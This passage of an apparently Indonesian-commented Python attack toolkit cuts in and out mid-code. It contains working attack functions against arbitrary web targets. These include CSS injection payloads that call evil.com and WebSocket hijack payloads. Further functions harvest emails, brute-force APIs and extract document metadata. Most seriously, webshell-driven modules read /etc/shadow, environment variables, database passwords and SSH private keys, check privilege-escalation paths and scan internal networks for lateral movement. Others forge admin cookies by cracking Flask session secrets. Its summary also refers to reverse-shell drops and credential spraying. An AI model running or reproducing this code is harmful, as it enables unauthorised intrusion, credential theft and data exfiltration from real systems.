    store("Host Header Injection", data)

# 39 — CSS Injection
CSS_PAYLOADS = [
    "}</style><script>alert(1)</script>",
    "{}*{background:url('https://evil.com/?c=')}",
    "input[value^='a']{background:url('https://evil.com/?c=a')}",
    "@import url('https://evil.com/steal.css');",
    "{}body{background-image:url('https://evil.com/')}",
]
CSS_PARAMS = ["style","css","color","theme","class","font","background"]

def css_injection(url):
    info(f"CSS Injection → {url}")
    data = {"url": url, "vulnerable": [], "tested": 0, "success": False}
    for param in CSS_PARAMS:
        for pl in CSS_PAYLOADS:
            target = f"{url}?{param}={requests.utils.quote(pl)}"
            try:
                r = req_get(target, timeout=5, verify=False, headers=HEADERS)
                data["tested"] += 1
                if pl.split("{")[0].replace("}","").strip() in r.text or \
                   "evil.com" in r.text or "@import" in r.text:
                    warn(f"CSS INJECTION → ?{param}={pl[:50]}")
                    data["vulnerable"].append({"param": param, "payload": pl})
                    data["success"] = True
                else:
                    miss(f"clean → ?{param}")
            except:
                pass
    store("CSS Injection", data)

# 40 — WebSocket Hijacking
WS_PAYLOADS = [
    '{"type":"auth","token":"test"}',
    '{"action":"admin","cmd":"whoami"}',
    '{"type":"message","content":"<script>alert(1)</script>"}',
    '{"__proto__":{"isAdmin":true}}',
]

def websocket_hijack(url):
    info(f"WebSocket Hijacking → {url}")
    data = {"url": url, "endpoints": [], "vulnerable": [], "success": False}
    ws_url = url.replace("https://","wss://").replace("http://","ws://")
    ws_paths = ["/ws","/websocket","/socket","/chat","/live","/realtime","/io"]
    try:
        import websocket as ws_lib
        for path in ws_paths:
            endpoint = ws_url.rstrip("/") + path
            try:
                ws = ws_lib.create_connection(endpoint, timeout=5,
                    sslopt={"cert_reqs": 0})
                hit(f"WebSocket terbuka → {endpoint}")
                data["endpoints"].append(endpoint)
                for pl in WS_PAYLOADS:
                    ws.send(pl)
                    resp = ws.recv()
                    if resp:
                        warn(f"WS RESPONSE → {resp[:100]}")
                        data["vulnerable"].append({"endpoint": endpoint,
                                                   "payload": pl, "response": resp[:200]})
                        data["success"] = True
                ws.close()
            except:
                miss(f"WS closed → {path}")
    except ImportError:
        info("websocket-client tidak terinstall. Install: pip install websocket-client")
        info(f"WS endpoints untuk cek manual: {[ws_url+p for p in ws_paths]}")
        data["endpoints"] = [ws_url+p for p in ws_paths]
        data["manual"] = True
    store("WebSocket Hijacking", data)

# 41 — Email Harvester
EMAIL_REGEX = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
EMAIL_SOURCES = ["","/contact","/about","/team","/staff","/support",
                 "/careers","/jobs","/help","/privacy","/legal"]

def email_harvester(url):
    info(f"Email Harvester → {url}")
    data = {"url": url, "emails": [], "success": False}
    found = set()
    for path in EMAIL_SOURCES:
        target = url.rstrip("/") + path
        try:
            r = req_get(target, timeout=6, verify=False, headers=HEADERS)
            emails = EMAIL_REGEX.findall(r.text)
            for e in emails:
                if e not in found and not e.endswith(('.png','.jpg','.gif','.css','.js')):
                    found.add(e)
                    hit(f"Email → {e}")
        except:
            pass
    # whois juga
    domain = get_domain(url)
    try:
        res = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=10)
        for e in EMAIL_REGEX.findall(res.stdout):
            if e not in found:
                found.add(e)
                hit(f"Email (WHOIS) → {e}")
    except:
        pass
    data["emails"] = list(found)
    if found: data["success"] = True
    print(C["c"] + f"\n  Total email: {len(found)}")
    store("Email Harvester", data)

# 42 — Parameter Discovery
PARAM_WORDLIST = [
    "id","user","username","email","password","token","key","api","debug",
    "test","admin","mode","type","action","cmd","command","exec","run",
    "file","path","page","url","redirect","ref","source","target","dest",
    "search","q","query","filter","sort","order","limit","offset","page",
    "lang","language","locale","format","output","callback","jsonp",
    "include","require","load","template","view","layout","theme",
    "config","setting","option","param","data","input","value","name",
    "code","hash","sign","signature","auth","session","cookie","csrf",
    "return","next","back","forward","goto","from","to","subject",
    "message","content","body","text","html","xml","json","raw",
    "version","v","ver","app","service","module","plugin","ext",
]

def parameter_discovery(url):
    info(f"Parameter Discovery → {url}")
    data = {"url": url, "found": [], "tested": len(PARAM_WORDLIST), "success": False}
    baseline_len = 0
    try:
        r0 = req_get(url, timeout=5, verify=False, headers=HEADERS)
        baseline_len = len(r0.text)
    except:
        pass
    for param in PARAM_WORDLIST:
        for val in ["1","true","test","admin","../etc/passwd"]:
            target = f"{url}?{param}={val}"
            try:
                r = req_get(target, timeout=4, verify=False, headers=HEADERS)
                diff = abs(len(r.text) - baseline_len)
                if r.status_code != 404 and diff > 50:
                    hit(f"PARAM FOUND → ?{param}={val} (diff: {diff} bytes, {r.status_code})")
                    data["found"].append({"param": param, "val": val,
                                         "status": r.status_code, "diff": diff})
                    data["success"] = True
                    break
            except:
                pass
    print(C["c"] + f"\n  Found: {len(data['found'])} parameter(s)")
    store("Parameter Discovery", data)

# 43 — API Endpoint Brute
API_VERSIONS = ["v1","v2","v3","api","rest","graphql","gql"]
API_ENDPOINTS = [
    "users","user","me","profile","account","accounts",
    "admin","config","settings","auth","login","logout","register",
    "token","refresh","verify","forgot","reset","password",
    "posts","articles","items","products","orders","invoices",
    "files","upload","download","export","import","search",
    "health","status","ping","version","info","debug","metrics",
    "keys","secrets","credentials","backup","logs","events",
]
HTTP_VERBS = ["GET","POST","PUT","DELETE","PATCH"]

def api_endpoint_brute(url):
    info(f"API Endpoint Brute → {url}")
    data = {"url": url, "found": [], "success": False}
    for ver in API_VERSIONS:
        for ep in API_ENDPOINTS:
            endpoint = f"{url.rstrip('/')}/{ver}/{ep}"
            try:
                r = req_get(endpoint, timeout=4, verify=False, headers=HEADERS)
                if r.status_code not in [404, 410]:
                    hit(f"[{r.status_code}] {endpoint}")
                    data["found"].append({"endpoint": endpoint,
                                          "status": r.status_code,
                                          "size": len(r.text)})
                    data["success"] = True
                    # cek method yang diizinkan
                    for verb in HTTP_VERBS[1:]:
                        try:
                            rv = requests.request(verb, endpoint, timeout=3,
                                                  verify=False, headers=HEADERS)
                            if rv.status_code not in [404,405,410]:
                                hit(f"  [{verb}] allowed → {rv.status_code}")
                        except:
                            pass
            except:
                pass
    print(C["c"] + f"\n  Found: {len(data['found'])} endpoint(s)")
    store("API Endpoint Brute", data)

# 44 — Tech Stack CVE Auto-Match (NVD API)
NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"

def tech_cve_match(url):
    info(f"Tech Stack CVE Auto-Match → {url}")
    data = {"url": url, "cves": [], "success": False}
    # ambil tech fingerprint dulu
    tech_data = {}
    try:
        r    = req_get(url, timeout=10, verify=False, headers=HEADERS)
        h    = r.headers
        body = r.text.lower()
        stack = []
        checks = {
            "wordpress": "wp-content" in body,
            "joomla"   : "joomla" in body,
            "drupal"   : "drupal" in body,
            "laravel"  : "laravel" in body,
            "django"   : "csrfmiddlewaretoken" in body,
            "nginx"    : "nginx" in h.get("server","").lower(),
            "apache"   : "apache" in h.get("server","").lower(),
            "php"      : "php" in h.get("x-powered-by","").lower(),
        }
        stack = [k for k, v in checks.items() if v]
        srv   = h.get("server","")
        if srv: stack.append(srv.split("/")[0].lower())
        hit(f"Stack terdeteksi: {stack}")
        # query NVD per keyword
        for kw in stack[:5]:
            try:
                resp = req_get(NVD_API, params={"keywordSearch": kw, "resultsPerPage": 5},
                               timeout=8, verify=False, headers=HEADERS)
                if resp.status_code == 200:
                    vulns = resp.json().get("vulnerabilities",[])
                    for v in vulns:
                        cve = v.get("cve",{})
                        cve_id = cve.get("id","")
                        desc   = cve.get("descriptions",[{}])[0].get("value","")[:120]
                        score  = cve.get("metrics",{}).get(
                            "cvssMetricV31",[{}])[0].get(
                            "cvssData",{}).get("baseScore","?")
                        warn(f"[{kw}] {cve_id} (CVSS: {score}) → {desc}")
                        data["cves"].append({"keyword": kw, "cve": cve_id,
                                             "score": score, "desc": desc})
                        data["success"] = True
            except:
                pass
    except Exception as e:
        miss(str(e))
    store("Tech CVE Auto-Match", data)

# 45 — Metadata Extractor
META_EXTS = [".pdf",".docx",".xlsx",".pptx",".doc",".xls",".ppt",".odt"]

def metadata_extractor(url):
    info(f"Metadata Extractor → {url}")
    data = {"url": url, "files": [], "metadata": [], "success": False}
    try:
        r    = req_get(url, timeout=10, verify=False, headers=HEADERS)
        body = r.text
        # kumpulkan link ke dokumen
        links = re.findall(r'href=["\']([^"\']+)["\']', body)
        doc_links = [l for l in links if any(l.lower().endswith(ext) for ext in META_EXTS)]
        hit(f"Dokumen ditemukan: {len(doc_links)}")
        for link in doc_links[:10]:
            if not link.startswith("http"):
                link = url.rstrip("/") + "/" + link.lstrip("/")
            try:
                rd = req_get(link, timeout=10, verify=False, headers=HEADERS)
                content = rd.content
                data["files"].append(link)
                # extract metadata dari PDF
                if link.lower().endswith(".pdf"):
                    text = content.decode(errors="ignore")
                    patterns = {
                        "Author"  : r'/Author\s*\(([^)]+)\)',
                        "Creator" : r'/Creator\s*\(([^)]+)\)',
                        "Producer": r'/Producer\s*\(([^)]+)\)',
                        "Subject" : r'/Subject\s*\(([^)]+)\)',
                    }
                    for label, pat in patterns.items():
                        m = re.search(pat, text)
                        if m:
                            warn(f"[{link.split('/')[-1]}] {label}: {m.group(1)}")
                            data["metadata"].append({"file": link, "key": label,
                                                     "value": m.group(1)})
                            data["success"] = True
                # extract dari docx/xlsx (ZIP format, cari [Content_Types].xml)
                elif any(link.lower().endswith(e) for e in [".docx",".xlsx",".pptx"]):
                    import zipfile, io
                    try:
                        z   = zipfile.ZipFile(io.BytesIO(content))
                        for zf in z.namelist():
                            if "core" in zf.lower():
                                xml = z.read(zf).decode(errors="ignore")
                                for tag in ["dc:creator","cp:lastModifiedBy",
                                            "dc:subject","dc:title"]:
                                    m = re.search(f'<{tag}>([^<]+)</{tag}>', xml)
                                    if m:
                                        warn(f"[{link.split('/')[-1]}] {tag}: {m.group(1)}")
                                        data["metadata"].append({"file": link,
                                            "key": tag, "value": m.group(1)})
                                        data["success"] = True
                    except:
                        pass
            except:
                pass
    except Exception as e:
        miss(str(e))
    store("Metadata Extractor", data)

# 46 — Data Exfiltrator (via active webshell)
EXFIL_TARGETS = [
    ("passwd",    "cat /etc/passwd"),
    ("shadow",    "cat /etc/shadow 2>/dev/null"),
    ("env",       "env"),
    ("hostname",  "hostname && id && uname -a"),
    ("cwd_files", "ls -la $(pwd)"),
    ("web_root",  "ls -la /var/www/html/ 2>/dev/null || ls -la /www/ 2>/dev/null"),
    ("db_config", "find / -name 'config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null | head -10"),
    ("db_creds",  "grep -r 'DB_PASSWORD\\|db_password\\|database_password' /var/www/ 2>/dev/null | head -20"),
    ("ssh_keys",  "ls ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null"),
    ("cron",      "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null"),
    ("network",   "ip a 2>/dev/null || ifconfig 2>/dev/null"),
    ("arp",       "arp -a 2>/dev/null"),
]

def data_exfiltrator(url):
    info(f"Data Exfiltrator → {url}")
    shell_url = input(C["w"] + "  Shell URL » ").strip()
    data = {"shell_url": shell_url, "exfil": {}, "success": False}
    for label, cmd in EXFIL_TARGETS:
        try:
            r      = req_get(shell_url, params={"c": cmd},
                             timeout=8, verify=False, headers=HEADERS)
            output = re.sub(r'<[^>]+>', '', r.text).strip()
            if output and len(output) > 5:
                warn(f"[{label}] → {output[:80]}")
                data["exfil"][label] = output
                data["success"] = True
            else:
                miss(f"{label} → empty")
        except Exception as e:
            miss(str(e))
    # simpan ke file lokal
    if data["success"]:
        ts    = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"exfil_{get_domain(url)}_{ts}.txt"
        with open(fname, "w") as f:
            for label, out in data["exfil"].items():
                f.write(f"\n=== {label} ===\n{out}\n")
        hit(f"Exfil saved → {fname}")
        data["saved"] = fname
    store("Data Exfiltrator", data)

# 47 — Privilege Escalation Checker
PRIVESC_CMDS = {
    "sudo_list"   : "sudo -l 2>/dev/null",
    "suid_bins"   : "find / -perm -4000 -type f 2>/dev/null | head -20",
    "writable_etc": "ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null",
    "writable_cron": "ls -la /etc/cron* /var/spool/cron* 2>/dev/null",
    "kernel_ver"  : "uname -r",
    "os_ver"      : "cat /etc/os-release 2>/dev/null | head -5",
    "capabilities": "getcap -r / 2>/dev/null | head -10",
    "docker_check": "id | grep docker; ls -la /var/run/docker.sock 2>/dev/null",
    "env_path"    : "echo $PATH; ls -la $(echo $PATH | tr ':' ' ') 2>/dev/null | grep -v '^total'",
    "writable_dirs": "find / -writable -type d 2>/dev/null | grep -v proc | head -10",
}
PRIVESC_INTERESTING = {
    "sudo_list"   : ["(ALL)","NOPASSWD","ALL"],
    "suid_bins"   : ["python","perl","bash","sh","find","vim","nmap","less","more","cp","mv"],
    "writable_etc": ["rw-","rwx"],
    "capabilities": ["cap_setuid","cap_net_raw","cap_dac_read_search"],
    "docker_check": ["docker","socket"],
}

def privesc_checker(url):
    info(f"PrivEsc Checker → {url}")
    shell_url = input(C["w"] + "  Shell URL » ").strip()
    data = {"shell_url": shell_url, "findings": [], "success": False}
    for label, cmd in PRIVESC_CMDS.items():
        try:
            r      = req_get(shell_url, params={"c": cmd},
                             timeout=8, verify=False, headers=HEADERS)
            output = re.sub(r'<[^>]+>', '', r.text).strip()
            if not output: continue
            interesting = PRIVESC_INTERESTING.get(label, [])
            if any(kw.lower() in output.lower() for kw in interesting) or not interesting:
                warn(f"[{label}] → {output[:120]}")
                data["findings"].append({"check": label, "output": output[:500]})
                data["success"] = True
            else:
                info(f"[{label}] → {output[:60]}")
        except Exception as e:
            miss(str(e))
    store("PrivEsc Checker", data)

# 48 — Lateral Movement Scanner
def lateral_movement(url):
    info(f"Lateral Movement Scanner → {url}")
    shell_url = input(C["w"] + "  Shell URL » ").strip()
    data = {"shell_url": shell_url, "hosts": [], "services": [], "success": False}
    # ambil network range dari shell
    try:
        r       = req_get(shell_url, params={"c": "ip a 2>/dev/null || ifconfig"},
                          timeout=8, verify=False, headers=HEADERS)
        net_out = re.sub(r'<[^>]+>', '', r.text).strip()
        # parse IP/CIDR
        ips = re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', net_out)
        hit(f"Internal IPs: {ips}")
        data["internal_ips"] = ips
        # scan range /24 dari tiap IP internal
        for ip in ips:
            if ip.startswith("127"): continue
            subnet = ".".join(ip.split(".")[:3])
            # ping sweep via shell
            ping_cmd = f"for i in $(seq 1 254); do ping -c1 -W1 {subnet}.$i &>/dev/null && echo {subnet}.$i; done"
            rp = req_get(shell_url, params={"c": ping_cmd}, timeout=30,
                         verify=False, headers=HEADERS)
            live = re.findall(r'\d+\.\d+\.\d+\.\d+', re.sub(r'<[^>]+>','',rp.text))
            for host in live:
                hit(f"Host live → {host}")
                data["hosts"].append(host)
                data["success"] = True
                # port scan via shell
                for port in [22, 80, 443, 3306, 5432, 6379, 27017, 8080, 8443]:
                    scan_cmd = f"(echo >/dev/tcp/{host}/{port}) 2>/dev/null && echo OPEN:{port}"
                    rs = req_get(shell_url, params={"c": scan_cmd},
                                 timeout=5, verify=False, headers=HEADERS)
                    out = re.sub(r'<[^>]+>','',rs.text)
                    if f"OPEN:{port}" in out:
                        warn(f"  {host}:{port} OPEN")
                        data["services"].append({"host": host, "port": port})
    except Exception as e:
        miss(str(e))
    store("Lateral Movement", data)

# 49 — Subdomain Takeover
TAKEOVER_FINGERPRINTS = {
    "github"    : ("There isn't a GitHub Pages site here", "GitHub Pages"),
    "heroku"    : ("No such app", "Heroku"),
    "netlify"   : ("Not found - Request ID", "Netlify"),
    "s3"        : ("NoSuchBucket", "AWS S3"),
    "fastly"    : ("Fastly error: unknown domain", "Fastly"),
    "shopify"   : ("Sorry, this shop is currently unavailable", "Shopify"),
    "tumblr"    : ("There's nothing here", "Tumblr"),
    "wpengine"  : ("The site you were looking for couldn't be found", "WPEngine"),
    "readme"    : ("Project doesnt exist", "ReadMe.io"),
    "surge"     : ("project not found", "Surge.sh"),
    "pantheon"  : ("The gods are wise", "Pantheon"),
    "azurewebsites": ("404 Web Site not found", "Azure"),
    "unbounce"  : ("The requested URL was not found", "Unbounce"),
    "helpscout" : ("No settings were found", "HelpScout"),
    "feedpress" : ("The feed has not been found", "FeedPress"),
}

def subdomain_takeover(url):
    domain = get_domain(url)
    info(f"Subdomain Takeover → {domain}")
    data = {"domain": domain, "vulnerable": [], "checked": 0, "success": False}
    subs = [
        "www","mail","ftp","admin","dev","api","test","staging","portal","vpn",
        "remote","login","cpanel","webmail","shop","blog","cdn","static","assets",
        "media","beta","old","backup","secure","app","mobile","m","support","help",
        "docs","status","news","events","store","payment","auth","sso","id",
    ]
    for sub in subs:
        host = f"{sub}.{domain}"
        # cek CNAME dulu
        try:
            res = subprocess.run(["dig","+short","CNAME",host],
                                 capture_output=True, text=True, timeout=5)
            cname = res.stdout.strip()
            if not cname: continue
            hit(f"CNAME: {host} → {cname}")
            # cek apakah CNAME pointing ke layanan yang bisa di-takeover
            for key, (fingerprint, service) in TAKEOVER_FINGERPRINTS.items():
                if key in cname.lower():
                    # cek response body
                    try:
                        r = req_get(f"http://{host}", timeout=6, verify=False, headers=HEADERS)
                        data["checked"] += 1
                        if fingerprint.lower() in r.text.lower():
                            warn(f"TAKEOVER POSSIBLE → {host} → {service} ({cname})")
                            data["vulnerable"].append({"subdomain": host, "cname": cname,
                                                       "service": service,
                                                       "fingerprint": fingerprint})
                            data["success"] = True
                    except:
                        pass
        except:
            pass
    print(C["c"] + f"\n  Checked: {data['checked']} | Vulnerable: {len(data['vulnerable'])}")
    store("Subdomain Takeover", data)

# 50 — Cookie Manipulation
import urllib.parse

def cookie_manipulation(url):
    info(f"Cookie Manipulation → {url}")
    data = {"url": url, "findings": [], "success": False}
    try:
        r = req_get(url, timeout=8, verify=False, headers=HEADERS)
        cookies = r.cookies
        if not cookies:
            miss("Tidak ada cookie dari target")
            store("Cookie Manipulation", data)
            return
        for ck in cookies:
            hit(f"Cookie: {ck.name} = {ck.value[:60]}")
            original = ck.value
            # 1. coba decode base64
            try:
                decoded = base64.b64decode(original + "==").decode(errors="ignore")
                hit(f"  [base64] → {decoded[:80]}")
                # coba flip nilai
                if "false" in decoded.lower():
                    flipped = decoded.replace("false","true").replace("False","True")
                    encoded = base64.b64encode(flipped.encode()).decode()
                    r2 = req_get(url, timeout=5, verify=False, headers=HEADERS,
                                 cookies={ck.name: encoded})
                    if r2.status_code == 200 and len(r2.text) != len(r.text):
                        warn(f"COOKIE FLIP HIT → {ck.name}: false→true")
                        data["findings"].append({"cookie": ck.name,
                            "attack": "base64_flip", "value": encoded})
                        data["success"] = True
                if "user" in decoded.lower() or "role" in decoded.lower():
                    admin_val = re.sub(r'"role"\s*:\s*"[^"]*"', '"role":"admin"', decoded)
                    admin_val = re.sub(r'"user"\s*:\s*"[^"]*"', '"user":"admin"', admin_val)
                    admin_enc = base64.b64encode(admin_val.encode()).decode()
                    r3 = req_get(url, timeout=5, verify=False, headers=HEADERS,
                                 cookies={ck.name: admin_enc})
                    if r3.status_code == 200:
                        warn(f"COOKIE ADMIN FORGE → {ck.name}")
                        data["findings"].append({"cookie": ck.name,
                            "attack": "admin_forge", "value": admin_enc})
                        data["success"] = True
            except:
                pass
            # 2. coba JSON langsung
            try:
                decoded_url = urllib.parse.unquote(original)
                obj = json.loads(decoded_url)
                hit(f"  [JSON cookie] → {obj}")
                if "role" in obj or "admin" in obj or "is_admin" in obj:
                    obj_admin = dict(obj)
                    obj_admin["role"]     = "admin"
                    obj_admin["admin"]    = True
                    obj_admin["is_admin"] = True
                    new_val = urllib.parse.quote(json.dumps(obj_admin))
                    r4 = req_get(url, timeout=5, verify=False, headers=HEADERS,
                                 cookies={ck.name: new_val})
                    if r4.status_code == 200:
                        warn(f"JSON COOKIE FORGE → {ck.name}: {obj_admin}")
                        data["findings"].append({"cookie": ck.name,
                            "attack": "json_forge", "value": new_val})
                        data["success"] = True
            except:
                pass
            # 3. coba weak secret Flask/Django session
            if original.count(".") >= 2 and original.startswith("eyJ"):
                hit(f"  [Flask session detected]")
                for secret in JWT_WEAK_SECRETS:
                    try:
                        import itsdangerous
                        s = itsdangerous.URLSafeTimedSerializer(secret)
                        val = s.loads(original, max_age=99999999)
                        warn(f"FLASK SECRET CRACKED → '{secret}' | data: {val}")
                        # forge admin
                        if isinstance(val, dict):
                            val["role"] = "admin"; val["admin"] = True
                        forged = s.dumps(val)
                        data["findings"].append({"cookie": ck.name,
                            "attack": "flask_secret_crack",
                            "secret": secret, "forged": forged})
                        data["success"] = True
                        break
                    except:
                        pass
    except Exception as e:
        miss(str(e))
    store("Cookie Manipulation", data)

# ══════════════════════════════════════════
#  FULL RECON
# ══════════════════════════════════════════

ALL_STEPS = [
    ("Header Inspector",        header_inspector),
    ("DNS Lookup",              dns_lookup),
    ("Port Scanner",            port_scanner),
    ("WHOIS Grab",              whois_grab),
    ("Dir Brute-Force",         dir_bruteforce),
    ("Tech Fingerprint",        tech_fingerprint),
    ("SQL Inject Probe",        sqli_probe),
    ("NoSQL Inject Probe",      nosql_probe),
    ("Command Inject Probe",    cmdi_probe),
    ("XSS Probe",               xss_probe),
    ("XXE Probe",               xxe_probe),
    ("Broken Auth",             broken_auth),
    ("Sensitive Data Scan",     sensitive_data_scan),
    ("Broken Access Control",   broken_access_ctrl),
    ("Security Misconfig",      security_misconfig),
    ("Insecure Deserialization",insecure_deser),
    ("Known Vuln Check",        known_vuln_check),
    ("Subdomain Enum",          subdomain_enum),
    ("LFI Probe",               lfi_probe),
    ("Open Redirect Scan",      open_redirect_scan),
    ("SSRF Probe",              ssrf_probe),
    ("File Upload Bypass",      file_upload_bypass),
    ("SSTI Probe",              ssti_probe),
    ("HTTP Request Smuggling",  http_smuggling),
    ("CORS Misconfiguration",   cors_misconfig),
    ("JWT Attack",              jwt_attack),
    ("GraphQL Introspection",   graphql_introspection),
    ("Prototype Pollution",     prototype_pollution),
    ("Google Dork",             google_dork),
    ("Wayback Scraper",         wayback_scraper),
    ("JS File Analyzer",        js_analyzer),
    ("XML Injection",           xml_injection),
    ("CRLF Injection",          crlf_injection),
    ("Host Header Injection",   host_header_injection),
    ("CSS Injection",           css_injection),
    ("WebSocket Hijacking",     websocket_hijack),
    ("Email Harvester",         email_harvester),
    ("Parameter Discovery",     parameter_discovery),
    ("API Endpoint Brute",      api_endpoint_brute),
    ("Tech CVE Auto-Match",     tech_cve_match),
    ("Metadata Extractor",      metadata_extractor),
    ("Data Exfiltrator",        data_exfiltrator),
    ("PrivEsc Checker",         privesc_checker),
    ("Lateral Movement",        lateral_movement),
    ("Subdomain Takeover",      subdomain_takeover),
    ("Cookie Manipulation",     cookie_manipulation),
]

def full_recon(url):
    print(C["m"] + C["B"] + "\n  ══════ FULL OWASP RECON ACTIVATED ══════\n")
    for name, fn in ALL_STEPS:
        section(name)
        fn(url)
        time.sleep(0.2)
    print(C["m"] + C["B"] + "\n  ══════ FULL RECON COMPLETE ══════\n")

# ══════════════════════════════════════════
#  SUMMARY — hanya yang berhasil + detail
# ══════════════════════════════════════════

def print_summary():
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    W  = 56

    def box_line(text, color=C["w"]):
        padded = text[:W-4].ljust(W-4)
        print(C["w"] + C["B"] + "  ║" + color + padded + C["w"] + C["B"] + "║")

    SUCCESS_LIST  = {m: d for m, d in RESULTS.items() if d.get("success")}
    VULN_FOUND    = []

    print()
    print(C["c"] + C["B"] + "  ╔" + "═"*W + "╗")
    box_line(f"  HASIL SCAN — {ts}", C["c"] + C["B"])
    box_line(f"  Target  : {TARGET_URL}", C["y"])
    box_line(f"  Metode  : {len(RESULTS)} dijalankan | {len(SUCCESS_LIST)} temuan", C["y"])
    print(C["c"] + C["B"] + "  ╠" + "═"*W + "╣")

    if not SUCCESS_LIST:
        box_line("  Tidak ada vulnerability yang ditemukan.", C["g"])
        print(C["c"] + C["B"] + "  ╚" + "═"*W + "╝\n")
        return

    for method, data in SUCCESS_LIST.items():
        print(C["c"] + C["B"] + "  ╠" + "─"*W + "╣")
        box_line(f"  ⚠  {method}", C["r"] + C["B"])
        print(C["c"] + C["B"] + "  ╠" + "─"*W + "╣")

        if method == "Header Inspector":
            box_line(f"    Status  : {data.get('status')}", C["y"])
            box_line(f"    URL     : {data.get('final_url','?')}", C["w"])
            VULN_FOUND.append(f"Header Inspector — status {data.get('status')}")

        elif method == "DNS Lookup":
            for rt, vals in data.get("records",{}).items():
                if vals:
                    box_line(f"    [{rt}] {', '.join(vals[:2])}", C["y"])
            VULN_FOUND.append("DNS Lookup — record ditemukan")

        elif method == "Port Scanner":
            opens = data.get("open",[])
            box_line(f"    Open ports: {opens}", C["r"])
            VULN_FOUND.append(f"Port Scanner — {len(opens)} port terbuka: {opens}")

        elif method == "WHOIS Grab":
            for l in data.get("info",[])[:4]:
                box_line(f"    {l}", C["y"])
            VULN_FOUND.append("WHOIS — info registrar ditemukan")

        elif method == "Dir Brute-Force":
            found = data.get("found",[])
            box_line(f"    Found: {len(found)} path", C["r"])
            for f in found[:5]:
                box_line(f"    [{f['status']}] {f['path']}", C["y"])
            VULN_FOUND.append(f"Dir Brute — {len(found)} path ditemukan")

        elif method == "Tech Fingerprint":
            detected = data.get("detected",[])
            box_line(f"    CMS/Stack : {', '.join(detected)}", C["y"])
            box_line(f"    Server    : {data.get('server','?')}", C["y"])
            VULN_FOUND.append(f"Tech Fingerprint — {', '.join(detected)}")

        elif method == "SQL Inject Probe":
            for pl in data.get("vulnerable",[])[:3]:
                box_line(f"    [ERROR-BASED] {pl}", C["r"])
                VULN_FOUND.append(f"SQLi Error-Based → {pl}")
            for pl in data.get("blind",[])[:3]:
                box_line(f"    [TIME-BASED]  {pl}", C["r"])
                VULN_FOUND.append(f"SQLi Time-Based → {pl}")

        elif method == "NoSQL Inject Probe":
            for pl in data.get("vulnerable",[])[:3]:
                box_line(f"    {pl[:50]}", C["r"])
            VULN_FOUND.append(f"NoSQL Injection — {len(data.get('vulnerable',[]))} payload hit")

        elif method == "Command Inject Probe":
            for pl in data.get("vulnerable",[])[:3]:
                box_line(f"    {pl}", C["r"])
            VULN_FOUND.append(f"CMDi — {len(data.get('vulnerable',[]))} payload hit")

        elif method == "XSS Probe":
            for pl in data.get("reflected",[])[:3]:
                box_line(f"    [REFLECTED] {pl[:50]}", C["r"])
            VULN_FOUND.append(f"XSS Reflected — {len(data.get('reflected',[]))} payload")

        elif method == "XXE Probe":
            box_line("    XXE injection terdeteksi", C["r"])
            VULN_FOUND.append("XXE Injection")

        elif method == "Broken Auth":
            for w in data.get("weak_creds",[])[:5]:
                box_line(f"    CREDS: {w['user']}:{w['pass']} @ {w['url']}", C["r"])
                VULN_FOUND.append(f"Broken Auth — {w['user']}:{w['pass']}")
            for ck in data.get("cookie_issues",[])[:3]:
                box_line(f"    COOKIE '{ck['cookie']}': {', '.join(ck['issues'])}", C["y"])
                VULN_FOUND.append(f"Cookie issue — {ck['cookie']}")

        elif method == "Sensitive Data Scan":
            if not data.get("https"):
                box_line("    HTTP tanpa enkripsi", C["r"])
                VULN_FOUND.append("No HTTPS")
            for e in data.get("exposed",[])[:5]:
                box_line(f"    EXPOSED: {e['path']} ({e['size']} bytes)", C["r"])
                VULN_FOUND.append(f"File exposed: {e['path']}")

        elif method == "Broken Access Control":
            for p in data.get("open_admin",[])[:4]:
                box_line(f"    [{p['status']}] {p['path']}", C["r"])
                VULN_FOUND.append(f"Open path: {p['path']}")
            for b in data.get("method_bypass",[])[:3]:
                box_line(f"    METHOD: {b['method']} ({b['status']})", C["r"])
                VULN_FOUND.append(f"Method bypass: {b['method']}")

        elif method == "Security Misconfig":
            for h in data.get("missing_headers",[])[:5]:
                box_line(f"    MISSING: {h}", C["y"])
                VULN_FOUND.append(f"Missing header: {h}")
            if data.get("verbose_errors"):
                box_line("    Verbose error info exposed", C["r"])
                VULN_FOUND.append("Verbose error exposed")

        elif method == "Insecure Deserialization":
            for v in data.get("vulnerable",[])[:3]:
                box_line(f"    {v}", C["r"])
            VULN_FOUND.append(f"Insecure Deser — {', '.join(data.get('vulnerable',[]))}")

        elif method == "Known Vuln Check":
            for m in data.get("matches",[])[:5]:
                box_line(f"    {m['version']} → {m['cve']}", C["r"])
                VULN_FOUND.append(f"CVE: {m['cve']}")

        elif method == "Subdomain Enum":
            for s in data.get("live",[])[:5]:
                box_line(f"    {s['host']} → {s['ip']}", C["y"])
            VULN_FOUND.append(f"Subdomain: {len(data.get('live',[]))} live")

        elif method == "SQLi Auto-Exploit":
            box_line(f"    Columns : {data.get('columns',0)}", C["y"])
            if data.get("database"):
                box_line(f"    Database: {data['database']}", C["r"])
                VULN_FOUND.append(f"SQLi dump — DB: {data['database']}")
            for tbl in data.get("tables",[])[:8]:
                box_line(f"    Table   : {tbl}", C["r"])
            for tbl, cols in data.get("columns_dump",{}).items():
                box_line(f"    Columns [{tbl}]: {', '.join(cols[:6])}", C["y"])

        elif method == "Reverse Shell Drop":
            box_line(f"    Param vuln : ?{data.get('vuln_param')}", C["r"])
            box_line(f"    Payload sent: {len(data.get('shell_sent',[]))}", C["r"])
            box_line(f"    Listener   : nc -lvnp {data.get('lport')}", C["y"])
            VULN_FOUND.append(f"Reverse Shell Drop → {data.get('lhost')}:{data.get('lport')}")

        elif method == "Credential Spray":
            for h in data.get("hits",[])[:5]:
                box_line(f"    {h['user']}:{h['pass']} ({h['status']})", C["r"])
                VULN_FOUND.append(f"Cred Spray hit — {h['user']}:{h['pass']}")

        elif method == "LFI Probe":
            for v in data.get("vulnerable",[])[:4]:
                box_line(f"    ?{v['param']}={v['payload'][:40]}", C["r"])
